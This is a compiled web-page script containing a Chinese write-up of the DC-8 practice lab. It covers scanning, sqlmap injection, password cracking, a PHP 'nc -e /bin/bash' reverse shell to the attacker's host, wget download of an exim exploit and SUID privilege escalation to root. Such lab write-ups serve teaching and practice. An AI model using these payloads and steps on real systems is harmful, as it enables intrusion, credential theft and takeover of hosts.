"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[1833],{24932(i,e){e.A=(i,e)=>{const a=i.__vccOpts||i;for(const[i,t]of e)a[i]=t;return a}},28725(i,e,a){a.r(e),a.d(e,{comp:()=>V,data:()=>F});var t=a(43990);const o=a.p+"assets/img/image-20240823161457-pgp6fgl.01db5072.png",n=a.p+"assets/img/image-20240823161554-59k6g0p.65c53021.png",p=a.p+"assets/img/image-20240823161920-y7ou5i0.ce873488.png",g=a.p+"assets/img/image-20240823162555-zfdjykf.8eeb50c4.png",r=a.p+"assets/img/image-20240823162532-moh29a0.b3f9337b.png",c=a.p+"assets/img/image-20240823162853-06gw6ag.655e59c0.png",l=a.p+"assets/img/image-20240823162947-k74bvu6.eb7dacb8.png",s=a.p+"assets/img/image-20240823163129-0rrigwx.919f8331.png",d=a.p+"assets/img/image-20240823163206-f78hkpj.a0b3482d.png",f=a.p+"assets/img/image-20240823163307-9ifd68j.77d3b039.png",m=a.p+"assets/img/image-20240823163507-clhbqmd.248cf1a9.png",u=a.p+"assets/img/image-20240823163725-wpe8utp.ee447a75.png",b=a.p+"assets/img/image-20240823163902-i0kh8wr.b9abdfba.png",h=a.p+"assets/img/image-20240823165442-hr30qfa.73adb8ae.png",y=a.p+"assets/img/image-20240823165602-cbhqw6y.192ca388.png",x=a.p+"assets/img/image-20240823165842-fy4d899.3ea86c54.png",v=a.p+"assets/img/image-20240823170301-a66hd2d.e352099d.png",z=a.p+"assets/img/image-20240823170751-7fzsrm6.48b01c37.png",w=a.p+"assets/img/image-20240823171255-v45evn7.2c1e7223.png",k=a.p+"assets/img/image-20240823171414-sf0oshv.a7f82177.png",_=a.p+"assets/img/image-20240823172027-9blx3e1.90af8283.png",D=a.p+"assets/img/image-20240823172120-87zrua0.da03c13a.png",q=a.p+"assets/img/image-20240823172252-o2lclm6.840f94da.png",C=a.p+"assets/img/image-20240823172420-yd4wu1x.9fe5625d.png",j=a.p+"assets/img/image-20240823172747-pqj5ktm.753ebf61.png",N=a.p+"assets/img/image-20240823172859-ur2bqaa.5abd70a2.png",I=a.p+"assets/img/image-20240823172945-sucs3r3.8f13a5a2.png",P=a.p+"assets/img/image-20240823173330-wc4zp7y.8cdac327.png",A=a.p+"assets/img/image-20240823173307-w46564x.c68814e7.png",S=a.p+"assets/img/image-20240823173820-3kumopa.b5ea2c13.png",T=a.p+"assets/img/image-20240823173738-qnfdsv5.af2a05e2.png",E=a.p+"assets/img/image-20240823174320-u097but.3b99e5c3.png",B=a.p+"assets/img/image-20240823175056-6wkl2da.a2ccdff2.png",H=a.p+"assets/img/image-20240823175333-e6jwa9f.1be93ba0.png",U={},V=(0,a(24932).A)(U,[["render",function(i,e){return(0,t.uX)(),(0,t.CE)("div",null,[...e[0]||(e[0]=[(0,t.Fv)('<ol><li><p>主机扫描使用arp-scan扫描工具 --localnet 扫描本地网络</p><figure><img src="'+o+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><p>​<code>.1</code>​（通常是网关或路由器的地址）和<code>.255</code>​（广播地址）。而<code>.254</code>​ 经常被用作子网内的一个特殊设备（如DHCP服务器）的地址，但这不是一个固定的规则.</p></li><li><p>使用Nmap端口扫描 -sV：探测开放端口以确定服务/版本信息；</p><p>​ <strong>​<code>-p-</code>​</strong> ​：这个选项告诉 Nmap 扫描目标上所有可能的端口（从 1 到 65535）。默认情况下，Nmap 只会扫描一些常见的端口，但使用 <code>-p-</code>​ 选项可以确保扫描所有端口</p><figure><img src="'+n+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>使用dirsearch扫描目录 python3 <a href="http://dirsearch.py" target="_blank" rel="noopener noreferrer">dirsearch.py</a> -u [target_url] # 攻击目标url地址</p><p>dirsearch -u 192.18.142 -e * -x 403 --random-agent</p><p>​<code>-e *</code>​ 参数表示使用所有内置的扩展名列表进行扫描</p><p>​<code>--random-agent</code>​ 在请求时使用随机的用户代理字符串，这有助于<span data-type="text" style="color:var(--b3-font-color11);">绕过</span>一些基于用户代理的访问控制或<span data-type="text" style="color:var(--b3-font-color11);">日志记录</span>。</p><p>​<code>-x 403</code>​ 参数在这里可能是想排除状态码为 403 Forbidden 的响应。</p><figure><img src="'+p+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>访问网站</p><figure><img src="'+g+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>发现注入点</p><figure><img src="'+r+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>sqlmap扫描</p><figure><img src="'+c+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>发现存在注入</p><p>布尔盲注、报错注入、时间盲注、联合查询</p><figure><img src="'+l+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>扫描数据库</p><p>sqlmap -u &quot;<a href="http://192.168.18.142/?nid=1" target="_blank" rel="noopener noreferrer">http://192.168.18.142/?nid=1</a>&quot;<span data-type="text" style="color:var(--b3-font-color8);"> -dbs</span></p><figure><img src="'+s+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><figure><img src="'+d+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>根据数据库名扫描表</p><p>sqlmap -u &quot;<a href="http://192.168.18.142/?nid=1" target="_blank" rel="noopener noreferrer">http://192.168.18.142/?nid=1</a>&quot; -D d7db <span data-type="text" style="color:var(--b3-font-color8);">-tables</span></p><figure><img src="'+f+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><figure><img src="'+m+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>扫描users表</p><figure><img src="'+u+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><p>得到后台账密</p><figure><img src="'+b+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>将密码复制出来保存到adpass.txt和johnpass.txt文件中，然后使用john工具进行爆破</p><figure><img src="'+h+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>得到账户john的密码为turtle，账户admin的密码无法爆破</p><p>使用dirb命令<code>dirb http://192.168.18.142</code>​ <span data-type="text" style="color:var(--b3-font-color9);">扫描网站目录和文件</span></p><p>dirb <a href="http://192.168.18.142" target="_blank" rel="noopener noreferrer">http://192.168.18.142</a></p><figure><img src="'+y+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><h4 id="robots-txt" tabindex="-1"><a class="header-anchor" href="#robots-txt"><span>robots.txt</span></a></h4><p>是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被robots访问的部分，robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。或者指定搜索引擎只收录指定的内容。</p><p>当一个搜索机器人（有的叫搜索蜘蛛）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt</p></li><li><p>登录上方页面找到登录地址</p><figure><img src="'+x+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>根据地址找到登录页面并登录</p><figure><img src="'+v+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>然后将反弹shell的命令<code> &lt;?php system(&quot;nc -e /bin/bash 192.168.172.131 1234&quot;); ?&gt; </code>IP地址为kali的IP地址 nc反向shell</p><p>System()函数的主要功能是在系统权限允许的情况是执行系统命令<br><img src="'+z+'" alt="image" loading="lazy"></p></li><li><p>监听靶机</p><figure><img src="'+w+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>然后回到网站contact us的view页面，随便输入一些信息然后点击【submit】就可以反弹回shell</p><figure><img src="'+k+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><figure><img src="'+_+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>此时的shell不是交互式shell，所以使用命令<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>​获取一个交互式的shell</p><figure><img src="'+D+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>查看可以用于suid提权的命令 <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>​ ★★</p><ul><li>​<code>find /</code>​：<code>find</code>​命令用于在目录树中搜索文件，并可以对搜索结果执行操作。这里的<code>/</code>​表示从<span data-type="text" style="color:var(--b3-font-color9);">根目录开始搜索整个系统</span>。</li><li>​<code>-user root</code>​：这个选项告诉<code>find</code>​命令<span data-type="text" style="color:var(--b3-font-color9);">只查找属于用户</span><code>root</code>​​​<span data-type="text" style="color:var(--b3-font-color9);">的文件</span>。<code>root</code>​是Linux系统中的超级用户，拥有对系统的完全访问权限。</li><li>​<code>-perm -4000</code>​：这个选项用于查找具有特定权限的文件。<code>-perm</code>​后面跟的数字或符号<span data-type="text" style="color:var(--b3-font-color8);">表示文件的权限</span>。在这里，<code>-4000</code>​是一个特殊的权限位，它代表设置用户ID（<span data-type="text" style="color:var(--b3-font-color9);">SUID</span>）权限。当一个可执行文件具有SUID权限时，<span data-type="text" style="color:var(--b3-font-color10);">用户执行该文件时将以文件所有者的身份运行</span>（在这个例子中是<code>root</code>​）。这允许普通用户执行通常需要更高权限的操作。然</li><li>​<code>-print</code>​：<u>​<code>find</code>​</u>​<u>命令默认会将找到的文件名输出到标准输出（通常是屏幕）。</u>​<u>​<code>-print</code>​</u>​<u>选项实际上在这里是隐式的，但明确写出来可以增强命令的可读性</u>。它告诉<code>find</code>​命令打印出找到的每个文件的路径。</li><li>​<code>2&gt;/dev/null</code>​：★★★<strong>这部分是重定向的一部分</strong>，用于处理错误消息。在shell中，<code>2</code>​​​​ <span data-type="text" style="color:var(--b3-font-color9);">代表标准错误</span>（stderr），而<code>&gt;</code>​是重定向操作符。<code>/dev/null</code>​​​​ <span data-type="text" style="color:var(--b3-card-warning-color);background-color:var(--b3-card-warning-background);">是一个特殊的设备文件，通常被称为“空设备”或“黑洞”</span>。写入它的任何数据都会被丢弃，读取它时通常立即返回文件结束。因此，<code>2&gt;/dev/null</code>​的意思是将<span data-type="text" style="background-color:var(--b3-font-background9);">所有标准错误输出重定向到</span><code>/dev/null</code>​​​，这样就不会在屏幕上显示任何错误信息了。这对于<span data-type="text" style="color:var(--b3-font-color11);">忽略那些由于权限不足而无法访问的目录的错误消息</span>特别有用。</li></ul><figure><img src="'+q+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>发现一个比较奇怪的命令exim4，先查看一下命令版本 <code>/usr/sbin/exim4 --version</code>​</p><figure><img src="'+C+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>​<code>searchsploit exim 4</code>​ 搜索可以利用的提权方法 <a href="http://xn--46996-2b3ht37iyr4alt2c.sh" target="_blank" rel="noopener noreferrer">选择使用46996.sh</a></p><figure><img src="'+j+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>使用靶机的wget命令将该脚本下载到靶机中，先将kali机的apache服务开启，命令<code>service apache2 start</code>​</p><figure><img src="'+N+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>将攻击脚本文件复制到Apache服务的根目录/var/www/html下，命令<code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html/exp.sh</code>​</p><figure><img src="'+I+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>在kali中使用set ff=unix，告诉编译器，使用unix换行符，否则会无法使用脚本</p><figure><img src="'+P+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><figure><img src="'+A+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>在靶机反弹回来的shell处使用命令<code>wget http://192.168.172.131/exp.sh</code>​将脚本下载到靶机中</p><p>由于前面目录没有权限所以换目录下载</p><figure><img src="'+S+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><figure><img src="'+T+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>成功将exp.sh下载到靶机中，但是发现没有执行权限，使用命令<code>chmod +x exp.sh</code>​赋予脚本执行权限，并使用命令<code>./exp.sh -m netcat</code>​来执行脚本</p><figure><img src="'+E+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><figure><img src="'+B+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>提权成功，跳转到/root目录下即可查看flag</p><figure><img src="'+H+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li></ol><p>‍</p>',2)])])}]]),F=JSON.parse('{"path":"/perm/DC-8%E9%9D%B6%E6%9C%BA.html","title":"DC-8靶机","lang":"zh-CN","frontmatter":{"title":"DC-8靶机","index":true,"isOriginal":true,"category":["靶机"],"tag":["靶机"],"description":"主机扫描使用arp-scan扫描工具 --localnet 扫描本地网络 imageimage ​.1​（通常是网关或路由器的地址）和.255​（广播地址）。而.254​ 经常被用作子网内的一个特殊设备（如DHCP服务器）的地址，但这不是一个固定的规则. 使用Nmap端口扫描 -sV：探测开放端口以确定服务/版本信息； ​ ​-p-​ ​：这个选项告诉...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"DC-8靶机\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-11-26T15:59:54.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"],["meta",{"property":"og:url","content":"https://min168.top/perm/DC-8%E9%9D%B6%E6%9C%BA.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"DC-8靶机"}],["meta",{"property":"og:description","content":"主机扫描使用arp-scan扫描工具 --localnet 扫描本地网络 imageimage ​.1​（通常是网关或路由器的地址）和.255​（广播地址）。而.254​ 经常被用作子网内的一个特殊设备（如DHCP服务器）的地址，但这不是一个固定的规则. 使用Nmap端口扫描 -sV：探测开放端口以确定服务/版本信息； ​ ​-p-​ ​：这个选项告诉..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-11-26T15:59:54.000Z"}],["meta",{"property":"article:tag","content":"靶机"}],["meta",{"property":"article:modified_time","content":"2025-11-26T15:59:54.000Z"}]]},"git":{"createdTime":1743083704000,"updatedTime":1764172794000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":3,"url":"https://github.com/youze"},{"name":"siyuan","username":"siyuan","email":"youze27@163.com","commits":2,"url":"https://github.com/siyuan"}]},"readingTime":{"minutes":5.79,"words":1738},"filePathRelative":"perm/DC-8靶机.md","excerpt":"<ol>\\n<li>\\n<p>主机扫描使用arp-scan扫描工具  --localnet 扫描本地网络</p>\\n<figure><figcaption>image</figcaption></figure>\\n<p>​<code>.1</code>​（通常是网关或路由器的地址）和<code>.255</code>​（广播地址）。而<code>.254</code>​ 经常被用作子网内的一个特殊设备（如DHCP服务器）的地址，但这不是一个固定的规则.</p>\\n</li>\\n<li>\\n<p>使用Nmap端口扫描   -sV：探测开放端口以确定服务/版本信息；</p>\\n<p>​ <strong>​<code>-p-</code>​</strong> ​：这个选项告诉 Nmap 扫描目标上所有可能的端口（从 1 到 65535）。默认情况下，Nmap 只会扫描一些常见的端口，但使用 <code>-p-</code>​ 选项可以确保扫描所有端口</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>使用dirsearch扫描目录 python3 <a href=\\"http://dirsearch.py\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">dirsearch.py</a> -u [target_url]  # 攻击目标url地址</p>\\n<p>dirsearch -u 192.18.142 -e * -x 403 --random-agent</p>\\n<p>​<code>-e *</code>​ 参数表示使用所有内置的扩展名列表进行扫描</p>\\n<p>​<code>--random-agent</code>​ 在请求时使用随机的用户代理字符串，这有助于<span data-type=\\"text\\" style=\\"color: var(--b3-font-color11);\\">绕过</span>一些基于用户代理的访问控制或<span data-type=\\"text\\" style=\\"color: var(--b3-font-color11);\\">日志记录</span>。</p>\\n<p>​<code>-x 403</code>​ 参数在这里可能是想排除状态码为 403 Forbidden 的响应。</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>访问网站</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>发现注入点</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>sqlmap扫描</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>发现存在注入</p>\\n<p>布尔盲注、报错注入、时间盲注、联合查询</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>扫描数据库</p>\\n<p>sqlmap -u \\"<a href=\\"http://192.168.18.142/?nid=1\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">http://192.168.18.142/?nid=1</a>\\"<span data-type=\\"text\\" style=\\"color: var(--b3-font-color8);\\"> -dbs</span></p>\\n<figure><figcaption>image</figcaption></figure>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>根据数据库名扫描表</p>\\n<p>sqlmap -u \\"<a href=\\"http://192.168.18.142/?nid=1\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">http://192.168.18.142/?nid=1</a>\\" -D d7db <span data-type=\\"text\\" style=\\"color: var(--b3-font-color8);\\">-tables</span></p>\\n<figure><figcaption>image</figcaption></figure>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>扫描users表</p>\\n<figure><figcaption>image</figcaption></figure>\\n<p>得到后台账密</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>将密码复制出来保存到adpass.txt和johnpass.txt文件中，然后使用john工具进行爆破</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>得到账户john的密码为turtle，账户admin的密码无法爆破</p>\\n<p>使用dirb命令<code>dirb http://192.168.18.142</code>​  <span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">扫描网站目录和文件</span></p>\\n<p>dirb <a href=\\"http://192.168.18.142\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">http://192.168.18.142</a></p>\\n<figure><figcaption>image</figcaption></figure>\\n<h4>robots.txt</h4>\\n<p>是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被robots访问的部分，robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。或者指定搜索引擎只收录指定的内容。</p>\\n<p>当一个搜索机器人（有的叫搜索蜘蛛）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt</p>\\n</li>\\n<li>\\n<p>登录上方页面找到登录地址</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>根据地址找到登录页面并登录</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>然后将反弹shell的命令<code> &lt;?php system(\\"nc -e /bin/bash 192.168.172.131 1234\\"); ?&gt;  </code>IP地址为kali的IP地址  nc反向shell</p>\\n<p>System()函数的主要功能是在系统权限允许的情况是执行系统命令<br>\\n</p>\\n</li>\\n<li>\\n<p>监听靶机</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>然后回到网站contact us的view页面，随便输入一些信息然后点击【submit】就可以反弹回shell</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>此时的shell不是交互式shell，所以使用命令<code>python -c \\"import pty; pty.spawn(\'/bin/bash\')\\"</code>​获取一个交互式的shell</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>查看可以用于suid提权的命令    <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>​ ★★</p>\\n<ul>\\n<li>​<code>find /</code>​：<code>find</code>​命令用于在目录树中搜索文件，并可以对搜索结果执行操作。这里的<code>/</code>​表示从<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">根目录开始搜索整个系统</span>。</li>\\n<li>​<code>-user root</code>​：这个选项告诉<code>find</code>​命令<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">只查找属于用户</span><code>root</code>​​​<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">的文件</span>。<code>root</code>​是Linux系统中的超级用户，拥有对系统的完全访问权限。</li>\\n<li>​<code>-perm -4000</code>​：这个选项用于查找具有特定权限的文件。<code>-perm</code>​后面跟的数字或符号<span data-type=\\"text\\" style=\\"color: var(--b3-font-color8);\\">表示文件的权限</span>。在这里，<code>-4000</code>​是一个特殊的权限位，它代表设置用户ID（<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">SUID</span>）权限。当一个可执行文件具有SUID权限时，<span data-type=\\"text\\" style=\\"color: var(--b3-font-color10);\\">用户执行该文件时将以文件所有者的身份运行</span>（在这个例子中是<code>root</code>​）。这允许普通用户执行通常需要更高权限的操作。然</li>\\n<li>​<code>-print</code>​：<u>​<code>find</code>​</u>​<u>命令默认会将找到的文件名输出到标准输出（通常是屏幕）。</u>​<u>​<code>-print</code>​</u>​<u>选项实际上在这里是隐式的，但明确写出来可以增强命令的可读性</u>。它告诉<code>find</code>​命令打印出找到的每个文件的路径。</li>\\n<li>​<code>2&gt;/dev/null</code>​：★★★<strong>这部分是重定向的一部分</strong>，用于处理错误消息。在shell中，<code>2</code>​​​​ <span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">代表标准错误</span>（stderr），而<code>&gt;</code>​是重定向操作符。<code>/dev/null</code>​​​​ <span data-type=\\"text\\" style=\\"color: var(--b3-card-warning-color); background-color: var(--b3-card-warning-background);\\">是一个特殊的设备文件，通常被称为“空设备”或“黑洞”</span>。写入它的任何数据都会被丢弃，读取它时通常立即返回文件结束。因此，<code>2&gt;/dev/null</code>​的意思是将<span data-type=\\"text\\" style=\\"background-color: var(--b3-font-background9);\\">所有标准错误输出重定向到</span><code>/dev/null</code>​​​，这样就不会在屏幕上显示任何错误信息了。这对于<span data-type=\\"text\\" style=\\"color: var(--b3-font-color11);\\">忽略那些由于权限不足而无法访问的目录的错误消息</span>特别有用。</li>\\n</ul>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>发现一个比较奇怪的命令exim4，先查看一下命令版本   <code>/usr/sbin/exim4 --version</code>​</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>​<code>searchsploit exim 4</code>​     搜索可以利用的提权方法  <a href=\\"http://xn--46996-2b3ht37iyr4alt2c.sh\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">选择使用46996.sh</a></p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>使用靶机的wget命令将该脚本下载到靶机中，先将kali机的apache服务开启，命令<code>service apache2 start</code>​</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>将攻击脚本文件复制到Apache服务的根目录/var/www/html下，命令<code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html/exp.sh</code>​</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>在kali中使用set ff=unix，告诉编译器，使用unix换行符，否则会无法使用脚本</p>\\n<figure><figcaption>image</figcaption></figure>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>在靶机反弹回来的shell处使用命令<code>wget http://192.168.172.131/exp.sh</code>​将脚本下载到靶机中</p>\\n<p>由于前面目录没有权限所以换目录下载</p>\\n<figure><figcaption>image</figcaption></figure>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>成功将exp.sh下载到靶机中，但是发现没有执行权限，使用命令<code>chmod +x exp.sh</code>​赋予脚本执行权限，并使用命令<code>./exp.sh -m netcat</code>​来执行脚本</p>\\n<figure><figcaption>image</figcaption></figure>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n<li>\\n<p>提权成功，跳转到/root目录下即可查看flag</p>\\n<figure><figcaption>image</figcaption></figure>\\n</li>\\n</ol>","autoDesc":true}')}}]);